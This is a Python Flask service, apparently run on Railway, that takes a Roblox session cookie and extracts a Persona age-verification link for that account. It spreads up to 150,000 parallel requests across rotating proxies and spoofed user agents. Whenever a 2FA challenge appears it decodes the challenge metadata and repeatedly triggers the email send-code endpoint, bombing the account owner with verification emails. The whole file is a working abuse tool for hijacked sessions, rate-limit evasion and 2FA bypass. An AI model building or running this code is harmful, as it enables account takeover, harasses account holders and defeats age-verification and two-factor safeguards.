# -*- coding: utf-8 -*-
"""
2FA Worker — бэкенд для Railway.
Исправлена ошибка нулевых запросов, добавлено логирование и 5-минутный цикл.
"""
import os
import re
import json
import base64
import random
import logging
import time
import threading as _threading
import concurrent.futures as _futures
import requests as _requests
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

try:
    import socks  # noqa: F401
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests[socks]", "-q"])

app = Flask(__name__)

WORKER_SECRET = os.environ.get("WORKER_SECRET", "mysecret")

_RAW_PROXIES = os.environ.get("PROXY_LIST", "")
_PROXY_POOL: list[str] = [p.strip() for p in _RAW_PROXIES.split(",") if p.strip()]
_proxy_idx = 0
_proxy_lock = _threading.Lock()

DEADLINE           = int(os.environ.get("DEADLINE", 300))
EMAIL_BURST_TARGET = int(os.environ.get("EMAIL_BURST_TARGET", 50))
BATCH_SIZE         = int(os.environ.get("BATCH_SIZE", 10))
PAUSE_BURST        = float(os.environ.get("PAUSE_BURST", 0.25))
PAUSE_POLL         = float(os.environ.get("PAUSE_POLL", 0.8))
PAUSE_429          = float(os.environ.get("PAUSE_429", 1.2))
RESEND_WAVE_SEC    = int(os.environ.get("RESEND_WAVE_SEC", 45))
MAX_TOTAL_REQUESTS = 150000

_URL_VERIFY = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
_URL_AUTH   = "https://users.roblox.com/v1/users/authenticated"
_BODY_VERIFY = {"generateLink": True, "ageEstimation": True, "parentVerification": False}

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

def _next_proxy() -> str | None:
    if not _PROXY_POOL:
        return None
    global _proxy_idx
    with _proxy_lock:
        idx = _proxy_idx % len(_PROXY_POOL)
        _proxy_idx += 1
    return _PROXY_POOL[idx]

def _proxy_dict(proxy_str: str | None) -> dict | None:
    if not proxy_str:
        return None
    if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
        return {"http": proxy_str, "https": proxy_str}
    if not proxy_str.startswith("http"):
        proxy_str = "http://" + proxy_str
    return {"http": proxy_str, "https": proxy_str}

def _base_headers(csrf: str | None = None) -> dict:
    h = {
        "User-Agent": random.choice(_USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/my/account#!/info",
    }
    if csrf:
        h["x-csrf-token"] = csrf
    return h

def extract_link_from_raw(body: str):
    if not body:
        return None
    m = re.search(r'https://[^\s"\'\\]+withpersona\.com[^\s"\'\\]*inquiry-id=[^\s"\'\\&]+(?:&[^\s"\'\\]*)?', body)
    if m:
        return m.group(0).rstrip("\\")
    m = re.search(r'inquiry-id=(inq_[A-Za-z0-9]+)', body)
    if m:
        inq_id = m.group(1)
        tok_m = re.search(r'session-token=([A-Za-z0-9_\-\.]+)', body)
        link = f"https://inquiry.withpersona.com/verify?inquiry-id={inq_id}"
        if tok_m:
            link += f"&session-token={tok_m.group(1)}"
        return link
    return None

def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
    try:
        proxy = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers())
        if proxies:
            s.proxies.update(proxies)

        uid = None
        r_user = s.get(_URL_AUTH, timeout=10)
        if r_user.status_code == 200:
            uid = r_user.json().get("id")

        r_csrf = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
        csrf = r_csrf.headers.get("x-csrf-token")
        if r_csrf.status_code == 200:
            link = extract_link_from_raw(r_csrf.text)
            if link:
                return uid, "__LINK__:" + link
        return uid, csrf
    except Exception as e:
        logging.error("_get_user_id_and_csrf error: %s", e)
        return None, None

def _trigger_2fa_email_send(session: _requests.Session, user_id: int | None, csrf: str, challenge_id: str, challenge_meta_b64: str) -> bool:
    try:
        meta_json = {}
        if challenge_meta_b64:
            padded = challenge_meta_b64 + "=" * (-len(challenge_meta_b64) % 4)
            decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
            meta_json = json.loads(decoded)

        inner_challenge_id = meta_json.get("challengeId") or meta_json.get("twostepVerificationChallengeId") or challenge_id
        action_type = meta_json.get("actionType") or "Generic"
        uid = user_id or meta_json.get("userId")

        if not uid or not inner_challenge_id:
            return False

        send_url = f"https://twostepverification.roblox.com/v1/users/{uid}/challenges/email/send-code"
        payload = {"actionType": action_type, "challengeId": inner_challenge_id}
        r_send = session.post(send_url, json=payload, headers=_base_headers(csrf), timeout=8)
        return r_send.status_code in (200, 204)
    except Exception:
        return False

def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: bool = True) -> dict:
    time.sleep(random.uniform(0.02, 0.22))
    try:
        proxy = _next_proxy()
        proxies = _proxy_dict(proxy)
        s = _requests.Session()
        s.cookies[".ROBLOSECURITY"] = cookie
        s.headers.update(_base_headers(csrf))
        if proxies:
            s.proxies.update(proxies)

        r = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
        new_csrf = r.headers.get("x-csrf-token")

        if r.status_code == 403 and new_csrf and not r.headers.get("rblx-challenge-type"):
            csrf = new_csrf
            s.headers["x-csrf-token"] = csrf
            r = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
            new_csrf = r.headers.get("x-csrf-token") or csrf

        link = None
        if r.status_code == 200:
            link = extract_link_from_raw(r.text)

        ctype = r.headers.get("rblx-challenge-type", "")
        cid   = r.headers.get("rblx-challenge-id", "")
        cmeta = r.headers.get("rblx-challenge-metadata", "")

        email_sent = False
        if r.status_code == 403 and ctype and trigger_email:
            email_sent = _trigger_2fa_email_send(s, user_id, new_csrf or csrf, cid, cmeta)

        return {
            "status": r.status_code, "link": link, "challengeType": ctype,
            "emailSent": email_sent, "newCsrf": new_csrf, "body": r.text[:200],
        }
    except Exception as e:
        return {"status": 0, "link": None, "body": str(e), "challengeType": "", "emailSent": False, "newCsrf": None}

def run_parallel_api_for_duration(cookie: str, workers: int = BATCH_SIZE, target_emails: int = EMAIL_BURST_TARGET, duration_sec: float = DEADLINE) -> str | None:
    start = time.time()
    last_wave_reset = start
    total = 0
    challenges_in_wave = 0

    user_id, csrf = _get_user_id_and_csrf(cookie)
    if csrf and csrf.startswith("__LINK__:"):
        return csrf[9:]

    if not csrf:
        for _ in range(3):
            time.sleep(0.5)
            user_id, csrf = _get_user_id_and_csrf(cookie)
            if csrf:
                break

    if not csrf:
        logging.error("КРИТИЧЕСКАЯ ОШИБКА: Не удалось получить CSRF токен для запуска 2FA потоков!")
        return None

    logging.info(f"Воркер запущен: user_id={user_id}, target_emails={target_emails}, deadline={duration_sec}s")

    with _futures.ThreadPoolExecutor(max_workers=workers) as ex:
        while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
            now = time.time()
            if challenges_in_wave >= target_emails and (now - last_wave_reset) >= RESEND_WAVE_SEC:
                challenges_in_wave = 0
                last_wave_reset = now

            need_more_emails = challenges_in_wave < target_emails
            futs = [ex.submit(_one_request, cookie, csrf, user_id, need_more_emails) for _ in range(workers)]
            results = [f.result() for f in _futures.as_completed(futs)]
            total += len(results)

            for r in results:
                if r.get("link"):
                    logging.info(f"УСПЕХ! Ссылка получена: {r['link']}")
                    return r["link"]
                if r.get("status") == 403 and r.get("challengeType"):
                    challenges_in_wave += 1

            for r in results:
                if r.get("newCsrf"):
                    csrf = r["newCsrf"]
                    break

            has_challenge = any(r.get("challengeType") for r in results if r["status"] == 403)
            has_plain_403 = any(not r.get("challengeType") for r in results if r["status"] == 403)
            has_429       = any(r["status"] == 429 for r in results)

            if has_plain_403 and not has_challenge:
                csrf = None

            if challenges_in_wave < target_emails:
                time.sleep(PAUSE_429 if has_429 else PAUSE_BURST)
            else:
                time.sleep(PAUSE_429 if has_429 else PAUSE_POLL)
    return None

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "file": "worker.py", "deadline_sec": DEADLINE})

@app.route("/get-link", methods=["POST"])
def get_link():
    secret = request.headers.get("X-Secret") or (request.json or {}).get("secret", "")
    if secret != WORKER_SECRET:
        return jsonify({"error": "unauthorized"}), 401
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    method = data.get("method", "camera").strip()
    if not cookie:
        return jsonify({"error": "cookie required"}), 400
    
    link = run_parallel_api_for_duration(cookie, workers=BATCH_SIZE, target_emails=EMAIL_BURST_TARGET, duration_sec=DEADLINE)
    if link:
        return jsonify({"link": link})
    return jsonify({"error": "failed to get link within 5 minutes"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
